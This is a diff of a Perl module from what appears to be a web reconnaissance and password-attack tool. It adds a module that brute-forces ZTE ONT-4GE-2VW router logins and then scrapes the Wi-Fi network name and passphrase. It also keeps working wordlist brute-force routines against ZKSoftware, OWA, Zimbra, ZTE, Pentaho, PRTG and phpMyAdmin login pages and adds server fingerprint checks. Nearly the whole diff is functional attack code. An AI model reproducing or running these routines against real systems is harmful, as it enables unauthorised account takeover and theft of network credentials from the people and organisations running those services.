@@ -578,10 +578,9 @@ my $proto = $self->proto;
 my %options = @_;
 my $module = $options{ module };
 my $passwords_file = $options{ passwords_file };
+my $password = $options{ password };
 my $user = $options{ user };
 my $path = $options{ path };
-
-
 
 
 print color('bold blue') if($debug);
@@ -594,351 +593,433 @@ if ($rport eq '80' || $rport eq '443')
 else
 	{$url = "$proto://".$rhost.":".$rport.$path; }
         
+	if ($module eq "ONT-4GE-2VW")
+	{
 
+		$headers->header("Origin" => $url);
+		$headers->header("Referer" => $url);
+		$headers->header("Upgrade-Insecure-Requests" => 1);
+			
 
-if ($module eq "ZKSoftware")
-{
-		
-	open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
-	while (my $password=<MYINPUT>)
-	{ 
-		$password =~ s/\n//g; 	
-		my $hash_data = {'username' => $user, 
-				'userpwd' => $password
-				};	
-	
-		my $post_data = convert_hash($hash_data);
-		
-		my $response = $self->dispatch(url => $url."/csl/check",method => 'POST',post_data =>$post_data, headers => $headers);
-		my $decoded_response = $response->decoded_content;
-		my $status = $response->status_line;
-		
-		print "[+] user:$user password:$password status:$status\n";
-		#print($decoded_response);
-		if ($status =~ /200/m)
+		my @passwords_list = []; 
+		if ($passwords_file ne '' )
 		{
-			if  ($decoded_response =~ /Department|Departamento|frame|menu|self.location.href='\/'/i){	 
-			print "Password encontrado: [ZKSoftware] $url Usuario:$user Password:$password\n";
-			last;
-			}							
-		}	
-		
-	}
-	close MYINPUT;	
-}#ZKSoftware
-
-if ($module eq "owa")
-{
-	my $counter = 1;	
-	open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
-	while (my $password=<MYINPUT>)
-	{ 
-		$password =~ s/\n//g; 	
-		my $hash_data = {"loginOp" => "login",
-						 "client" => "preferred",
-						'username' => $user, 
-						'password' => $password
-				};	
-	
-		my $post_data = convert_hash($hash_data);
-		
-		$headers->header("Content-Type" => "application/x-www-form-urlencoded");
-		$headers->header("Cookie" => "ZM_TEST=true");
-		$headers->header("Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");				
-		
-		my $response = $self->dispatch(url => $url,method => 'POST',post_data =>$post_data, headers => $headers);
-		my $decoded_response = $response->decoded_content;
-		my $status = $response->status_line;
-		
-		if ($decoded_response =~ /error en el servicio de red|network service error/i)
-		{				 
-			print "El servidor Zimbra esta bloqueando nuestra IP :( \n";
-			last;
-										
-		}	
-		
-		
-		print "[+] user:$user password:$password status:$status\n";
-		if ($status =~ /302/m)
-		{				 
-			print "Password encontrado: [zimbra] $url (Usuario:$user Password:$password)";
-			last;
-										
+			print "Archivo password";
+			open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
+			while (my $password=<MYINPUT>)
+			{ 						
+				push @passwords_list,$password; 
+			}
 		}
-		
-		#if (0 == $counter % 10) {
-			#print "Sí es múltiplo de 10\n";
-			#sleep 120;
-		#}			
-		$counter = $counter + 1;
-		#sleep 1;
-	}
-	close MYINPUT;	
-}#owa
-
-if ($module eq "zimbra")
-{
-	my $counter = 1;	
-	open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
-	while (my $password=<MYINPUT>)
-	{ 
-		$password =~ s/\n//g; 	
-		my $hash_data = {"loginOp" => "login",
-						 "client" => "preferred",
-						'username' => $user, 
-						'password' => $password
-				};	
-	
-		my $post_data = convert_hash($hash_data);
-		
-		$headers->header("Content-Type" => "application/x-www-form-urlencoded");
-		$headers->header("Cookie" => "ZM_TEST=true");
-		$headers->header("Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");				
-		
-		my $response = $self->dispatch(url => $url,method => 'POST',post_data =>$post_data, headers => $headers);
-		my $decoded_response = $response->decoded_content;
-		my $status = $response->status_line;
-		
-		if ($decoded_response =~ /error en el servicio de red|network service error/i)
-		{				 
-			print "El servidor Zimbra esta bloqueando nuestra IP :( \n";
-			last;
-										
-		}	
-		
-		
-		print "[+] user:$user password:$password status:$status\n";
-		if ($status =~ /302/m)
-		{				 
-			print "Password encontrado: [zimbra] $url (Usuario:$user Password:$password)";
-			last;
-										
-		}
-		
-		#if (0 == $counter % 10) {
-			#print "Sí es múltiplo de 10\n";
-			#sleep 120;
-		#}			
-		$counter = $counter + 1;
-		#sleep 1;
-	}
-	close MYINPUT;	
-}#zimbra
-
-
-#ZTE
-if ($module eq "zte")
-{
-			
-	open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
-	while (my $password=<MYINPUT>)
-	{ 
-	
-		$headers->header("Content-Type" => "application/x-www-form-urlencoded");
-		$headers->header("Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");		
-		$headers->header("Cookie" => "_TESTCOOKIESUPPORT=1");		
-		
-		my $response = $self->dispatch(url => $url,method => 'GET', headers => $headers);
-		my $decoded_response = $response->decoded_content;
-		$decoded_response =~ s/"//g; 
-		$decoded_response =~ s/\)//g; 
-		my $status = $response->status_line;
-	
-
-		#getObj(Frm_Logintoken.value = 8;;
-		$decoded_response =~ /Frm_Logintoken.value = (.*?);/;
-		my $Frm_Logintoken = $1; 
-				
-		
-		$password =~ s/\n//g; 	
-		my $hash_data = {"frashnum" => "",
-						 "action" => "login",
-						 "Frm_Logintoken" => $Frm_Logintoken,
-						'Username' => $user, 
-						'Password' => $password
-				};	
-	
-
-		my $post_data = convert_hash($hash_data);
-		
-		$response = $self->dispatch(url => $url,method => 'POST',post_data =>$post_data, headers => $headers);
-		$decoded_response = $response->decoded_content;
-		$status = $response->status_line;
-		
-		print "[+] user:$user password:$password status:$status\n";
-		if ($status =~ /302/m)
-		{				 
-			print "Password encontrado: [ZTE] $url (Usuario:$user Password:$password)\n";
-			last;
-										
-		}	
-		
-	}
-	close MYINPUT;	
-}
-
-# pentaho
-if ($module eq "pentaho")
-{
-			
-	open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
-	while (my $password=<MYINPUT>)
-	{ 
-		$password =~ s/\n//g; 
-		$headers->header("Content-Type" => "application/x-www-form-urlencoded; charset=UTF-8");
-		$headers->header("Accept" => "text/plain, */*; q=0.01");		
-		$headers->header("X-Requested-With" => "XMLHttpRequest");		
-						
-		my $hash_data = {"locale" => "en_US",						 
-						'j_username' => $user, 
-						'j_password' => $password
-				};	
-	
-
-		my $post_data = convert_hash($hash_data);
-		     	   
-		my $response = $self->dispatch(url => $url."pentaho/j_spring_security_check",method => 'POST',post_data =>$post_data, headers => $headers);
-		my $response_headers = $response->headers_as_string;
-		my $decoded_response = $response->decoded_content;
-		my $status = $response->status_line;
-		
-		print "[+] user:$user password:$password status:$status\n";
-		#Location: /pentaho/Home (password OK)		#Location: /pentaho/Login?login_error=1 (password BAD)
-		if ($response_headers =~ /Home/i)
-		{				 
-			print "Password encontrado: [Pentaho] $url (Usuario:$user Password:$password)\n";
-			last;
-										
-		}	
-		
-	}
-	close MYINPUT;	
-}
-
-if ($module eq "PRTG")
-{
-
-	$headers->header("Content-Type" => "application/x-www-form-urlencoded");		
-	open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
-	while (my $password=<MYINPUT>)
-	{ 
-		$password =~ s/\n//g; 	
-		my $hash_data = {'username' => $user, 
-				'password' => $password,
-				'guiselect' => "radio"
-				};	
-	
-		my $post_data = convert_hash($hash_data);
-		
-		my $response = $self->dispatch(url => $url."/public/checklogin.htm",method => 'POST',post_data =>$post_data, headers => $headers);
-		my $decoded_response = $response->decoded_content;
-		my $response_headers = $response->headers_as_string;
-		my $status = $response->status_line;
-		
-		print "[+] user:$user password:$password status:$status\n";
-		
-		
-		if (!($response_headers =~ /error/m) && ! ($status =~ /500 read timeout/m)){	 
-			print "Password encontrado: [PRTG] $url \nUsuario:$user Password:$password\n";
-			last;
-		}
-		
-	}
-	close MYINPUT;	
-}#PRTG
-
-
-if ($module eq "phpmyadmin")
-{
-		
-	open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
-	while (my $password=<MYINPUT>)
-	{ 
-		
-		$password =~ s/\n//g; 	
-		my $response = $self->dispatch(url => $url,method => 'GET', headers => $headers);
-		my $decoded_response = $response->decoded_content;
-				
-		#open (SALIDA,">phpmyadmin.html") || die "ERROR: No puedo abrir el fichero google.html\n";
-		#print SALIDA $decoded_response;
-		#close (SALIDA);
-
-		if ($decoded_response =~ /navigation.php/i ||  $decoded_response =~ /logout.php/i)
-		{			
-			print "[phpmyadmin] $url (Sistema sin password)\n";
-			last;									
-		}	 
-		
-		#name="token" value="3e011556a591f8b68267fada258b6d5a"
-		$decoded_response =~ /name="token" value="(.*?)"/;
-		my $token = $1;
-
-
-
-		if ($decoded_response =~ /respondiendo|not responding|<h1>Error<\/h1>/i)
-		{			
-			print "ERROR: El servidor no está respondiendo \n";
-			last;									
-		}	 
-
-		
-		#pma_username=dgdf&pma_password=vhhg&server=1&target=index.php&token=918ab63463cf3b565d0073973b84f21c
-		my $hash_data = {'pma_username' => $user, 
-				'pma_password' => $password,
-				'token' => $token,
-				'target' => "index.php",
-				'server' => "1",
-				};	
-	
-		my $post_data = convert_hash($hash_data);
-		GET:		
-		$headers->header("Content-Type" => "application/x-www-form-urlencoded");
-		$response = $self->dispatch(url => $url."index.php",method => 'POST',post_data =>$post_data, headers => $headers);
-		$decoded_response = $response->decoded_content;	
-		my $status = $response->status_line;	
-		my $response_headers = $response->headers_as_string;
-		
-		#Refresh: 0; http://181.188.172.2/phpmyadmin/index.php?token=dd92af52b6eeefd014f7254ca02b0c25
-		 
-		
-		if ($status =~ /500/m)
-			{goto GET;}
-			
-		if ($status =~/30/m || $response_headers =~/Refresh: /m)
+		else
 		{
-			#Location: http://172.16.233.136/phpMyAdmin2/index.php?token=17d5777095918f70cf052a1cd769d985
-			$response_headers =~ /Location:(.*?)\n/;
-			my $new_url = $1; 	
-			if ($new_url eq ''){
-				$response_headers =~ /Refresh: 0; (.*?)\n/;
-				$new_url = $1;
+			@passwords_list[0]=$password; 
+		}
+		
+		
+		foreach my $password (@passwords_list) 
+		{
+			$password =~ s/\n//g; 	
+			
+			
+			my $response = $self->dispatch(url => $url,method => 'GET', headers => $headers);
+			my $decoded_response = $response->decoded_content;
+			#getObj("Frm_Logintoken").value = "19";
+			$decoded_response =~ /getObj\("Frm_Logintoken"\).value = "(.*?)"/;
+			my $Frm_Logintoken = $1; 
+			#print "decoded_response $decoded_response\n";
+
+			my $hash_data = {'Username' => $user, 
+			'Password' => $password,
+			'frashnum'=> '',
+			'action'=> 'login',
+			'Frm_Logintoken'=> $Frm_Logintoken
+			};	
+
+			my $post_data = convert_hash($hash_data);
+			
+			$response = $self->dispatch(url => $url,method => 'POST',post_data =>$post_data, headers => $headers);
+			$decoded_response = $response->decoded_content;
+			my $status = $response->status_line;						
+			print "[+] user:$user password:$password status:$status\n";
+			#print($decoded_response);
+			if ($status =~ /302/m)
+			{							
+				$response = $self->dispatch(url => $url.'getpage.gch?pid=1002&nextpage=net_wlan_basic_t1.gch' ,method => 'GET', headers => $headers);
+				$decoded_response = $response->decoded_content;							
+				$decoded_response =~ s/[^\x00-\x7f]//g;
+				my $KeyPassphrase;
+				#KeyPassphrase','675430or'
+				if ($decoded_response =~ /Transfer_meaning\('KeyPassphrase','(\w+)'\);/) {
+					$KeyPassphrase = $1;					
+				}
+					
+				#'ESSID','CRIS'
+				my $ESSID;
+				if ($decoded_response =~ /Transfer_meaning\('ESSID','(\w+)'\);/) {
+					$ESSID = $1;					
+				}
+			
+				print "Password encontrado: [ZTE ONT-4GE-2VW] $url Usuario:$user Password:$password ESSID $ESSID KeyPassphrase $KeyPassphrase \n";
+				last;											
+			}	
+		}				
+		close MYINPUT;	
+	}#ZKSoftware
+
+	if ($module eq "ZKSoftware")
+	{
+		my @passwords_list = []; 
+		if ($passwords_file ne '' )
+		{
+			open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
+			while (my $password=<MYINPUT>)
+			{ 						
+				push @passwords_list,$password; 
+			}
+		}
+		else
+		{
+			push @passwords_list,$password; 
+		}
+		
+
+		foreach my $password (@passwords_list) {
+			$password =~ s/\n//g; 	
+			my $hash_data = {'username' => $user, 
+					'userpwd' => $password
+					};	
+		
+			my $post_data = convert_hash($hash_data);
+			
+			my $response = $self->dispatch(url => $url."/csl/check",method => 'POST',post_data =>$post_data, headers => $headers);
+			my $decoded_response = $response->decoded_content;
+			my $status = $response->status_line;
+			
+			print "[+] user:$user password:$password status:$status\n";
+			#print($decoded_response);
+			if ($status =~ /200/m)
+			{
+				if  ($decoded_response =~ /Department|Departamento|frame|menu|self.location.href='\/'/i){	 
+				print "Password encontrado: [ZKSoftware] $url Usuario:$user Password:$password\n";
+				last;
+				}							
+			}	
+		}				
+		close MYINPUT;	
+	}#ZKSoftware
+
+	if ($module eq "owa")
+	{
+		my $counter = 1;	
+		open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
+		while (my $password=<MYINPUT>)
+		{ 
+			$password =~ s/\n//g; 	
+			my $hash_data = {"loginOp" => "login",
+							"client" => "preferred",
+							'username' => $user, 
+							'password' => $password
+					};	
+		
+			my $post_data = convert_hash($hash_data);
+			
+			$headers->header("Content-Type" => "application/x-www-form-urlencoded");
+			$headers->header("Cookie" => "ZM_TEST=true");
+			$headers->header("Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");				
+			
+			my $response = $self->dispatch(url => $url,method => 'POST',post_data =>$post_data, headers => $headers);
+			my $decoded_response = $response->decoded_content;
+			my $status = $response->status_line;
+			
+			if ($decoded_response =~ /error en el servicio de red|network service error/i)
+			{				 
+				print "El servidor OWA esta bloqueando nuestra IP :( \n";
+				last;
+											
+			}	
+			
+			
+			print "[+] user:$user password:$password status:$status\n";
+			if ($status =~ /302/m)
+			{				 
+				print "Password encontrado: [zimbra] $url (Usuario:$user Password:$password)";
+				last;
+											
 			}
 			
-			#print "new_url $new_url \n";
+			#if (0 == $counter % 10) {
+				#print "Sí es múltiplo de 10\n";
+				#sleep 120;
+			#}			
+			$counter = $counter + 1;
+			#sleep 1;
+		}
+		close MYINPUT;	
+	}#owa
+
+	if ($module eq "zimbra")
+	{
+		my $counter = 1;	
+		open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
+		while (my $password=<MYINPUT>)
+		{ 
+			$password =~ s/\n//g; 	
+			my $hash_data = {"loginOp" => "login",
+							"client" => "preferred",
+							'username' => $user, 
+							'password' => $password
+					};	
 		
-			$response = $self->dispatch(url => $new_url, method => 'GET');
-			$decoded_response = $response->decoded_content;								
-			#open (SALIDA,">phpmyadmin2.html") || die "ERROR: No puedo abrir el fichero google.html\n";
+			my $post_data = convert_hash($hash_data);
+			
+			$headers->header("Content-Type" => "application/x-www-form-urlencoded");
+			$headers->header("Cookie" => "ZM_TEST=true");
+			$headers->header("Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");				
+			
+			my $response = $self->dispatch(url => $url,method => 'POST',post_data =>$post_data, headers => $headers);
+			my $decoded_response = $response->decoded_content;
+			my $status = $response->status_line;
+			
+			if ($decoded_response =~ /error en el servicio de red|network service error/i)
+			{				 
+				print "El servidor Zimbra esta bloqueando nuestra IP :( \n";
+				last;
+											
+			}	
+			
+			
+			print "[+] user:$user password:$password status:$status\n";
+			if ($status =~ /302/m)
+			{				 
+				print "Password encontrado: [zimbra] $url (Usuario:$user Password:$password)";
+				last;
+											
+			}
+			
+			#if (0 == $counter % 10) {
+				#print "Sí es múltiplo de 10\n";
+				#sleep 120;
+			#}			
+			$counter = $counter + 1;
+			#sleep 1;
+		}
+		close MYINPUT;	
+	}#zimbra
+
+
+	#ZTE
+	if ($module eq "zte")
+	{
+				
+		open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
+		while (my $password=<MYINPUT>)
+		{ 
+		
+			$headers->header("Content-Type" => "application/x-www-form-urlencoded");
+			$headers->header("Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");		
+			$headers->header("Cookie" => "_TESTCOOKIESUPPORT=1");		
+			
+			my $response = $self->dispatch(url => $url,method => 'GET', headers => $headers);
+			my $decoded_response = $response->decoded_content;
+			$decoded_response =~ s/"//g; 
+			$decoded_response =~ s/\)//g; 
+			my $status = $response->status_line;
+		
+
+			#getObj(Frm_Logintoken.value = 8;;
+			$decoded_response =~ /Frm_Logintoken.value = (.*?);/;
+			my $Frm_Logintoken = $1; 
+					
+			
+			$password =~ s/\n//g; 	
+			my $hash_data = {"frashnum" => "",
+							"action" => "login",
+							"Frm_Logintoken" => $Frm_Logintoken,
+							'Username' => $user, 
+							'Password' => $password
+					};	
+		
+
+			my $post_data = convert_hash($hash_data);
+			
+			$response = $self->dispatch(url => $url,method => 'POST',post_data =>$post_data, headers => $headers);
+			$decoded_response = $response->decoded_content;
+			$status = $response->status_line;
+			
+			print "[+] user:$user password:$password status:$status\n";
+			if ($status =~ /302/m)
+			{				 
+				print "Password encontrado: [ZTE] $url (Usuario:$user Password:$password)\n";
+				last;
+											
+			}	
+			
+		}
+		close MYINPUT;	
+	}
+
+	# pentaho
+	if ($module eq "pentaho")
+	{
+				
+		open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
+		while (my $password=<MYINPUT>)
+		{ 
+			$password =~ s/\n//g; 
+			$headers->header("Content-Type" => "application/x-www-form-urlencoded; charset=UTF-8");
+			$headers->header("Accept" => "text/plain, */*; q=0.01");		
+			$headers->header("X-Requested-With" => "XMLHttpRequest");		
+							
+			my $hash_data = {"locale" => "en_US",						 
+							'j_username' => $user, 
+							'j_password' => $password
+					};	
+		
+
+			my $post_data = convert_hash($hash_data);
+					
+			my $response = $self->dispatch(url => $url."pentaho/j_spring_security_check",method => 'POST',post_data =>$post_data, headers => $headers);
+			my $response_headers = $response->headers_as_string;
+			my $decoded_response = $response->decoded_content;
+			my $status = $response->status_line;
+			
+			print "[+] user:$user password:$password status:$status\n";
+			#Location: /pentaho/Home (password OK)		#Location: /pentaho/Login?login_error=1 (password BAD)
+			if ($response_headers =~ /Home/i)
+			{				 
+				print "Password encontrado: [Pentaho] $url (Usuario:$user Password:$password)\n";
+				last;
+											
+			}	
+			
+		}
+		close MYINPUT;	
+	}
+
+	if ($module eq "PRTG")
+	{
+
+		$headers->header("Content-Type" => "application/x-www-form-urlencoded");		
+		open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
+		while (my $password=<MYINPUT>)
+		{ 
+			$password =~ s/\n//g; 	
+			my $hash_data = {'username' => $user, 
+					'password' => $password,
+					'guiselect' => "radio"
+					};	
+		
+			my $post_data = convert_hash($hash_data);
+			
+			my $response = $self->dispatch(url => $url."/public/checklogin.htm",method => 'POST',post_data =>$post_data, headers => $headers);
+			my $decoded_response = $response->decoded_content;
+			my $response_headers = $response->headers_as_string;
+			my $status = $response->status_line;
+			
+			print "[+] user:$user password:$password status:$status\n";
+			
+			
+			if (!($response_headers =~ /error/m) && ! ($status =~ /500 read timeout/m)){	 
+				print "Password encontrado: [PRTG] $url \nUsuario:$user Password:$password\n";
+				last;
+			}		
+		}
+		close MYINPUT;	
+	}#PRTG
+
+
+	if ($module eq "phpmyadmin")
+	{
+			
+		open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
+		while (my $password=<MYINPUT>)
+		{ 
+			
+			$password =~ s/\n//g; 	
+			my $response = $self->dispatch(url => $url,method => 'GET', headers => $headers);
+			my $decoded_response = $response->decoded_content;
+					
+			#open (SALIDA,">phpmyadmin.html") || die "ERROR: No puedo abrir el fichero google.html\n";
 			#print SALIDA $decoded_response;
 			#close (SALIDA);
-		}
-		
-		print "[+] user:$user password:$password status:$status\n";
-	    
-		#open (SALIDA,">phpmyadminn.html") || die "ERROR: No puedo abrir el fichero google.html\n";
-		#print SALIDA $decoded_response;
-		#close (SALIDA);
+
+			if ($decoded_response =~ /navigation.php/i ||  $decoded_response =~ /logout.php/i)
+			{			
+				print "[phpmyadmin] $url (Sistema sin password)\n";
+				last;									
+			}	 
 			
-					
-		if (!($decoded_response =~ /pma_username/m) && !($decoded_response =~ /Cannot log in to the MySQL server|1045 El servidor MySQL/i))
-		{			
-			print "Password encontrado: [phpmyadmin] $url Usuario:$user Password:$password\n";
-			last;									
-		}	
+			#name="token" value="3e011556a591f8b68267fada258b6d5a"
+			$decoded_response =~ /name="token" value="(.*?)"/;
+			my $token = $1;
+
+
+
+			if ($decoded_response =~ /respondiendo|not responding|<h1>Error<\/h1>/i)
+			{			
+				print "ERROR: El servidor no está respondiendo \n";
+				last;									
+			}	 
+
+			
+			#pma_username=dgdf&pma_password=vhhg&server=1&target=index.php&token=918ab63463cf3b565d0073973b84f21c
+			my $hash_data = {'pma_username' => $user, 
+					'pma_password' => $password,
+					'token' => $token,
+					'target' => "index.php",
+					'server' => "1",
+					};	
 		
-	}
-	close MYINPUT;	
-}#phpmyadmin
+			my $post_data = convert_hash($hash_data);
+			GET:		
+			$headers->header("Content-Type" => "application/x-www-form-urlencoded");
+			$response = $self->dispatch(url => $url."index.php",method => 'POST',post_data =>$post_data, headers => $headers);
+			$decoded_response = $response->decoded_content;	
+			my $status = $response->status_line;	
+			my $response_headers = $response->headers_as_string;
+			
+			#Refresh: 0; http://181.188.172.2/phpmyadmin/index.php?token=dd92af52b6eeefd014f7254ca02b0c25
+			
+			
+			if ($status =~ /500/m)
+				{goto GET;}
+				
+			if ($status =~/30/m || $response_headers =~/Refresh: /m)
+			{
+				#Location: http://172.16.233.136/phpMyAdmin2/index.php?token=17d5777095918f70cf052a1cd769d985
+				$response_headers =~ /Location:(.*?)\n/;
+				my $new_url = $1; 	
+				if ($new_url eq ''){
+					$response_headers =~ /Refresh: 0; (.*?)\n/;
+					$new_url = $1;
+				}
+				
+				#print "new_url $new_url \n";
+			
+				$response = $self->dispatch(url => $new_url, method => 'GET');
+				$decoded_response = $response->decoded_content;								
+				#open (SALIDA,">phpmyadmin2.html") || die "ERROR: No puedo abrir el fichero google.html\n";
+				#print SALIDA $decoded_response;
+				#close (SALIDA);
+			}
+			
+			print "[+] user:$user password:$password status:$status\n";
+			
+			#open (SALIDA,">phpmyadminn.html") || die "ERROR: No puedo abrir el fichero google.html\n";
+			#print SALIDA $decoded_response;
+			#close (SALIDA);
+				
+						
+			if (!($decoded_response =~ /pma_username/m) && !($decoded_response =~ /Cannot log in to the MySQL server|1045 El servidor MySQL/i))
+			{			
+				print "Password encontrado: [phpmyadmin] $url Usuario:$user Password:$password\n";
+				last;									
+			}	
+			
+		}
+		close MYINPUT;	
+	}#phpmyadmin
 
 
 }
@@ -1293,10 +1374,17 @@ sub getData
 
 	if($decoded_response =~ /Cisco Unified Communications/i)
 		{$server="Cisco Unified Communications";} 	
-
 	
 	if($decoded_response =~ /CSCOE/i)
 		{$server="ciscoASA";} 
+
+	if($decoded_response =~ /OLT Web Management Interface/i)
+		{$server="OLT Web Management Interface";} 
+
+	if($decoded_response =~ /Janus WebRTC Server/i)
+		{$server="Janus WebRTC Server";} 
+		
+
 
 	if($decoded_response =~ /X-OWA-Version/i)
 		{$type=$type."|"."owa";} 	
@@ -1660,7 +1748,7 @@ if ($method eq 'POST')
    my $post_data = $options{ post_data };           
    my $req = HTTP::Request->new(POST => $url, $headers);
    $req->content($post_data);
-   $response = $self->browser->request($req);    
+   $response = $self->browser->request($req);  
   }  
   
 if ($method eq 'POST_MULTIPART')
@@ -1709,7 +1797,7 @@ print "building browser \n" if ($debug);
 
    
 my $browser = LWP::UserAgent->new( max_redirect => $max_redirect, env_proxy => 1,keep_alive => 1, timeout => 15, agent => "Mozilla/4.76 [en] (Win98; U)",ssl_opts => { verify_hostname => 0 ,  SSL_verify_mode => 0});
-
+$browser->requests_redirectable(['http', 'https']);
 $browser->cookie_jar(HTTP::Cookies->new());
 $browser->show_progress(1) if ($debug);
 
